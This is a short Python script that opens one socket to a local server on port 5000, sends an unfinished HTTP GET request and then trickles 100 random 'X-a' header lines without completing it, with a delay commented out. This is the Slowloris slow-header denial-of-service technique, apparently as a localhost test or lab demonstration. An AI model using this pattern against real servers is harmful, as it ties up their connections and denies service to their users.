import socket
import time
import random

target_ip = "127.0.0.1"
target_port = 5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

s.send(b"GET /? HTTP/1.1\r\nHost: " + target_ip.encode('utf-8') + b"\r\n")

for i in range(100):
    x_a_header = "X-a: {}\r\n".format(random.randint(1, 5000)).encode('utf-8')
    s.send(x_a_header)
    # time.sleep(15)

s.close()